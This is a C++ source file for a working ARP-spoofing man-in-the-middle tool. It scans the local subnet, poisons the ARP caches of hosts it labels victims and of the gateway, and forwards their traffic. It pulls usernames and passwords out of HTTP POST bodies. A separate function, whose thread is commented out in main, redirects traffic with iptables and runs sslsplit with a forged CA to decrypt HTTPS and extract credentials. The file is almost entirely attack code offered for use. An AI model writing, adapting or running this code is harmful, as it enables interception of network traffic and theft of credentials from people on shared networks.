#include <iostream>
#include <string>
#include <vector>
#include <utility>
#include <cstring>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <netinet/ip.h> 
#include <arpa/inet.h>
#include <string>
#include <cstring>
#include <iomanip>
#include <sys/select.h> 
#include <fstream>
#include <sstream>
#include <array>
#include <algorithm> 
#include <thread> 
#include <chrono> 
#include <regex> // Added for regular expressions
#include <cstdlib> // Added for system calls
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <unordered_map>

#define ETHER_HEADER_SIZE sizeof(struct ether_header)
#define ARP_HEADER_SIZE sizeof(struct ether_arp)
#define ETHER_TYPE_ARP 0x0806
#define ETHER_HW_TYPE 0x0001
#define ETHER_PROTO_TYPE_IPv4 0x0800
#define ETHER_HW_SIZE 6
#define ETHER_PROTO_SIZE 4
#define ARP_REQUEST 1

std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> victims;

uint8_t local_mac[6]; // Your MAC address
uint8_t local_ip[4]; // Your IP address
uint8_t gateway_mac[6];
char* interface_name;

void interceptSSL() {
    // Execute sslsplit command to perform SSL interception
    std::string sslsplit_command = "iptables -t nat -F;"
                                    "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080;"
                                    "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443;"
                                    "touch /tmp/sslsplit;"
                                    "sslsplit -D -L /tmp/sslsplit -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 &";
    system(sslsplit_command.c_str()); // Execute the command

    // Open the temporary file to read intercepted SSL traffic
    std::ifstream file("/tmp/sslsplit");
    if (!file.is_open()) {
        std::cerr << "Failed to open /tmp/sslsplit" << std::endl;
        return;
    }

    // Read intercepted SSL traffic and extract sensitive information
    std::string line;
    std::regex pattern("username=(.*)&password=(.*)&");
    while (std::getline(file, line)) {
        std::smatch match;
        if (std::regex_search(line, match, pattern)) {
            // Print extracted username and password
            std::cout << "[*] Victim sent possible username and password to the website" << std::endl;
            std::cout << "Username: " << match[1].str() << std::endl;
            std::cout << "Password: " << match[2].str() << std::endl;
        }
    }

    file.close(); // Close the file
}

size_t findPosition(const std::string& str, const std::string& target) {
    size_t pos = str.find(target);
    if (pos != std::string::npos) {
        return pos;
    }
    // Return -1 if the target substring is not found
    return std::string::npos;
}

void processEthernetFrame(uint8_t* frame, size_t frame_len) {

    
    if (frame_len < ETHER_HEADER_SIZE) {
        std::cerr << "Invalid Ethernet frame" << std::endl;
        return;
    }

    struct ether_header* eth_hdr = reinterpret_cast<struct ether_header*>(frame);
    uint8_t* src_mac = eth_hdr->ether_shost;
    uint8_t* dst_mac = eth_hdr->ether_dhost;

    char src_mac_str[18];
    char dst_mac_str[18];
    sprintf(src_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
    sprintf(dst_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]);

    // Print source and destination MAC addresses

    if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {
        // Extract the IP header
        struct iphdr* ip_hdr = reinterpret_cast<struct iphdr*>(frame + ETHER_HEADER_SIZE);

        // Convert source and destination IP addresses to human-readable strings
        char src_ip_str[INET_ADDRSTRLEN];
        char dst_ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(ip_hdr->saddr), src_ip_str, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &(ip_hdr->daddr), dst_ip_str, INET_ADDRSTRLEN);

        bool is_dst_mac_local = true;
        for (int i = 0; i < ETHER_ADDR_LEN; ++i) {
            if (dst_mac[i] != local_mac[i]) {
                is_dst_mac_local = false;
                break;
            }
        }


        // Print source and destination IP addresses
        if (strcmp(dst_ip_str, inet_ntoa(*(struct in_addr*)local_ip)) != 0 && is_dst_mac_local) {
            /*std::cout << "Source MAC: " << src_mac_str << std::endl;
            std::cout << "Destination MAC: " << dst_mac_str << std::endl;
            std::cout << "Source IP: " << src_ip_str << std::endl;
            std::cout << "Destination IP: " << dst_ip_str << std::endl;*/
            if (ip_hdr->protocol == IPPROTO_TCP) {
                // Extract the TCP payload
                struct tcphdr* tcp_hdr = reinterpret_cast<struct tcphdr*>(frame + sizeof(struct ether_header) + (ip_hdr->ihl * 4));
                uint8_t* tcp_payload = frame + sizeof(struct ether_header) + (ip_hdr->ihl * 4) + (tcp_hdr->doff * 4);
                if (memcmp(tcp_payload, "POST", 4) == 0) {
                    
                    int tcp_payload_len = ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4) - (tcp_hdr->doff * 4);
                    std::string payloadStr(reinterpret_cast<char*>(tcp_payload), tcp_payload_len);

                    //std::cout << "Payload: " << payloadStr<< std::endl;

                    size_t usernamePos = findPosition(payloadStr, "txtUsername=");
                    size_t passwordPos = findPosition(payloadStr, "&txtPassword=");

                    // Check if both substrings were found
                    if (usernamePos != std::string::npos && passwordPos != std::string::npos) {
                        // Extract the substring between "txtUsername" and "txtPassword"
                        std::string between = payloadStr.substr(usernamePos + std::string("txtUsername=").length(), 
                                                        passwordPos - (usernamePos + std::string("txtUsername=").length()));
                        std::string afterPassword = payloadStr.substr(passwordPos + std::string("&txtPassword=").length());

                        // Output the result
                        std::cout << "\nUsername: " << between << std::endl;
                        std::cout << "Password: " << afterPassword << std::endl;
                    } 
                                    
                    
                }

            }
            uint8_t* new_frame = new uint8_t[frame_len];
            std::memcpy(new_frame, frame, frame_len);
            struct ether_header* new_eth_hdr = reinterpret_cast<struct ether_header*>(new_frame);
            std::memcpy(new_eth_hdr->ether_shost, local_mac, ETHER_ADDR_LEN);
            
            std::memcpy(new_eth_hdr->ether_dhost, gateway_mac, ETHER_ADDR_LEN);
            for (const auto& victim : victims) {
                uint8_t victim_ip[4] = {victim.first[0],victim.first[1],victim.first[2],victim.first[3]};
                if (strcmp(dst_ip_str, inet_ntoa(*(struct in_addr*)victim_ip))==0) {
                    std::memcpy(new_eth_hdr->ether_dhost, victim.second.data(), ETHER_ADDR_LEN);
                    break;
                }
            }

            int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
            if (sockfd < 0) {
                perror("Socket creation failed");
                return;
            }

            // Send the new packet over the network
            struct sockaddr_ll device;
            memset(&device, 0, sizeof(device));
            device.sll_ifindex = if_nametoindex(interface_name);
            sendto(sockfd, new_frame, frame_len, 0, (struct sockaddr*)&device, sizeof(device));

            // Close the socket
            close(sockfd);
            delete[] new_frame;

        }
    }
}

void receivePackets(int sockfd) {
    while (true) {
        // Receive the Ethernet frame into a buffer
        uint8_t buffer[2048];
        ssize_t bytes_received = recv(sockfd, buffer, sizeof(buffer), 0);
        if (bytes_received < 0) {
            perror("Error receiving packet");
        } else if (bytes_received >= ETHER_HEADER_SIZE) {
            // Process the received Ethernet frame
            processEthernetFrame(buffer, bytes_received);
        }
    }
}


std::vector<uint8_t> ipStringToUint8Array(const std::string& ip) {
    std::vector<uint8_t> result;
    std::stringstream ss(ip);
    std::string octet;
    
    while (std::getline(ss, octet, '.')) {
        try {
            // Convert octet string to uint8_t and push into result vector
            result.push_back(static_cast<uint8_t>(std::stoi(octet)));
        } catch (const std::invalid_argument& e) {
            std::cerr << "Invalid IP address format: " << e.what() << std::endl;
            result.clear();
            break;
        } catch (const std::out_of_range& e) {
            std::cerr << "Out of range error: " << e.what() << std::endl;
            result.clear();
            break;
        }
    }
    
    // Check if we got exactly 4 octets
    if (result.size() != 4) {
        std::cerr << "Invalid IP address format: " << ip << std::endl;
        result.clear();
    }
    
    return result;
}

std::pair<uint8_t*, uint8_t*> getOwnAddress(const std::string& interface_name) {
    uint8_t* own_ip_bytes = new uint8_t[4];
    std::fill(own_ip_bytes, own_ip_bytes + 4, 0);

    uint8_t* own_mac_bytes = new uint8_t[6];
    std::fill(own_mac_bytes, own_mac_bytes + 6, 0);

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        std::cerr << "Failed to open socket" << std::endl;
        return std::make_pair(own_ip_bytes, own_mac_bytes);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface_name.c_str(), IFNAMSIZ);

    // Get IP address
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        std::cerr << "Failed to get interface address" << std::endl;
        close(sockfd);
        return std::make_pair(own_ip_bytes, own_mac_bytes);
    }
    struct sockaddr_in* addr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    uint32_t ip = addr->sin_addr.s_addr;
    memcpy(own_ip_bytes, &ip, 4);

    // Get MAC address
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        std::cerr << "Failed to get hardware address" << std::endl;
        close(sockfd);
        return std::make_pair(own_ip_bytes, own_mac_bytes);
    }
    unsigned char* mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);
    memcpy(own_mac_bytes, mac, 6);

    close(sockfd);
    return std::make_pair(own_ip_bytes, own_mac_bytes);
}

std::string getDefaultGateway() {
    std::string line;
    std::ifstream file("/proc/net/route");

    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string iface, dest, gateway, flags, refcnt, use, metric, mask, mtu, window, irtt;
        
        if (!(iss >> iface >> dest >> gateway >> flags >> refcnt >> use >> metric >> mask >> mtu >> window >> irtt)) {
            continue;
        }
        
        if (iface == "0" || dest != "00000000" || gateway == "00000000") {
            continue;
        }
        
        // Convert hexadecimal gateway IP to dotted decimal notation
        unsigned long gw;
        std::istringstream(gateway) >> std::hex >> gw;
        struct in_addr addr;
        addr.s_addr = gw;
        return inet_ntoa(addr);
    }

    return "Unknown";
}

void craft_ARP_packet(uint8_t* packet, const uint8_t* src_mac, const uint8_t* src_ip, const uint8_t* dst_mac,const uint8_t* dst_ip) {
    struct ether_header* eth_hdr = (struct ether_header*)packet;
    struct ether_arp* arp_hdr = (struct ether_arp*)(packet + ETHER_HEADER_SIZE);

    // Ethernet header
    memcpy(eth_hdr->ether_shost, src_mac, ETHER_ADDR_LEN);
    memcpy(eth_hdr->ether_dhost, dst_mac, ETHER_ADDR_LEN); 
    eth_hdr->ether_type = htons(ETHER_TYPE_ARP);

    // ARP header
    arp_hdr->arp_hrd = htons(ETHER_HW_TYPE);
    arp_hdr->arp_pro = htons(ETHER_PROTO_TYPE_IPv4);
    arp_hdr->arp_hln = ETHER_HW_SIZE;
    arp_hdr->arp_pln = ETHER_PROTO_SIZE;
    arp_hdr->arp_op = htons(ARP_REQUEST);
    memcpy(arp_hdr->arp_sha, src_mac, ETHER_ADDR_LEN);
    memcpy(arp_hdr->arp_spa, src_ip, sizeof(struct in_addr));
    memcpy(arp_hdr->arp_tha, dst_mac, ETHER_ADDR_LEN); // Zero out target MAC
    memcpy(arp_hdr->arp_tpa, dst_ip, sizeof(struct in_addr));
}

void send_ARP_packet(int sockfd, uint8_t* packet, size_t packet_len, const char* interface) {
    struct sockaddr_ll device;
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(interface);
    sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&device, sizeof(device));
}

std::pair<uint8_t*, uint8_t*> process_ARP_response(uint8_t* packet) {
    struct ether_header* eth_hdr = (struct ether_header*)packet;
    struct ether_arp* arp_hdr = (struct ether_arp*)(packet + ETHER_HEADER_SIZE);

    if (ntohs(eth_hdr->ether_type) == ETHER_TYPE_ARP && ntohs(arp_hdr->arp_op) == ARPOP_REPLY) {
        // Extract IP and MAC addresses from ARP response
        uint8_t* src_mac = arp_hdr->arp_sha;
        uint8_t* src_ip = arp_hdr->arp_spa;
        
        std::string gateway = getDefaultGateway();
        char source_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &arp_hdr->arp_spa, source_ip, INET_ADDRSTRLEN);
        std::string source_ip_str = source_ip;
        if (source_ip_str != gateway) {
            char source_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &arp_hdr->arp_spa, source_ip, INET_ADDRSTRLEN);
            std::cout<<source_ip;
            std::cout << "\t\t";
            for (int i = 0; i < ETHER_ADDR_LEN; ++i) {
                std::cout << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)src_mac[i];
                if (i < ETHER_ADDR_LEN - 1) std::cout << ":";
            }
            std::cout << std::endl;
        }
        return std::make_pair(src_ip, src_mac);
    }

    // Return empty strings if no valid ARP response
    return std::make_pair(nullptr, nullptr);
}


void spoofing(const std::string& interface, const uint8_t* local_mac, const uint8_t* target_mac, const uint8_t* target_ip, const uint8_t* spoof_ip) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    uint8_t packet[ETHER_HEADER_SIZE + ARP_HEADER_SIZE]; // ARP packet size

    // Craft ARP packet
    craft_ARP_packet(packet, local_mac, spoof_ip, target_mac,target_ip);

    // Send ARP reply packet
    send_ARP_packet(sockfd, packet, sizeof(packet), interface.c_str());

    close(sockfd);
}


int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>" << std::endl;
        return 1;
    }

    interface_name = argv[1];

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }
    std::string gateway_str = getDefaultGateway();
    std::vector<uint8_t> gateway=ipStringToUint8Array(gateway_str);
    std::pair<uint8_t*, uint8_t*> addresses = getOwnAddress(interface_name);
    //uint8_t src_mac[6]; // Your MAC address
    //uint8_t src_ip[4]; // Your IP address
    
    if (addresses.first && addresses.second) {
        // Print the IP address
        for(int i=0;i<4;i++){
            local_ip[i]=addresses.first[i];
        }

        // Print the MAC address
        for (int i = 0; i < 6; ++i) {
            local_mac[i]=addresses.second[i];
        }
        

        // Free the allocated memory
    } else {
        std::cerr << "Failed to get own address" << std::endl;
    }

    // Craft ARP packet
    delete[] addresses.first;
    delete[] addresses.second;


    uint8_t packet[ETHER_HEADER_SIZE + ARP_HEADER_SIZE]; // ARP packet size
    std::cout << "Available devices:" << std::endl;
    std::cout << "----------------------------------------------" << std::endl;
    std::cout << "IP" << std::string(22, ' ')  << "MAC" << std::endl;
    std::cout << "----------------------------------------------" << std::endl;

    
    // Receive and process ARP responses
    for (uint8_t i=1;i<=254;i++) {
        uint8_t dst_ip[4] = {local_ip[0], local_ip[1], local_ip[2], i}; // Network gateway IP
        uint8_t dst_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; 
        craft_ARP_packet(packet, local_mac, local_ip, dst_mac,dst_ip);
        send_ARP_packet(sockfd, packet, sizeof(packet), interface_name); 
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sockfd, &readfds);

        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 500;
        uint8_t buffer[2048];

        int ready = select(sockfd + 1, &readfds, nullptr, nullptr, &timeout);
        if (ready == -1) {
            perror("select() failed");
            close(sockfd);
            return 1;
        } else if (ready == 0) {
            //std::cout << "Timeout occurred. No ARP responses received." << std::endl;
        } else {
            if (FD_ISSET(sockfd, &readfds)) {
                uint8_t buffer[2048];
                ssize_t bytes_received = recv(sockfd, buffer, sizeof(buffer), 0);
                if (bytes_received < 0) {
                    perror("Error receiving packet");
                } else if (bytes_received >= ETHER_HEADER_SIZE) {
                    std::pair<uint8_t*, uint8_t*> victim=process_ARP_response(buffer);
                    std::array<uint8_t, 4> victim_ip;
                    std::array<uint8_t, 6> victim_mac;
                    if (victim.first && victim.second) {
                        // Assuming victim.first and victim.second point to valid memory locations
                        std::copy(victim.first, victim.first + 4, victim_ip.begin());
                        std::copy(victim.second, victim.second + 6, victim_mac.begin());
                        if (std::vector<uint8_t>(victim_ip.begin(), victim_ip.end()) == gateway) {
                            for(int j=0;j<6;j++){
                                gateway_mac[j]=victim_mac[j];
                            }
                        }
                        victims.push_back(std::make_pair(victim_ip, victim_mac));
                    }
                            
                }
            }
        }
    }

    std::thread receiveThread(receivePackets, sockfd);
    //std::thread t1(interceptSSL);
    


    while(1){
        for (const auto& victim : victims) {
            
            if (std::vector<uint8_t>(victim.first.begin(), victim.first.end()) != gateway) {
                spoofing(interface_name, local_mac, victim.second.data(), victim.first.data(), gateway.data());
                spoofing(interface_name, local_mac, gateway_mac, gateway.data(), victim.first.data());
                
            }
            
        }

    }

    receiveThread.join();
    //t1.join();
    

    close(sockfd);
    return 0;
}
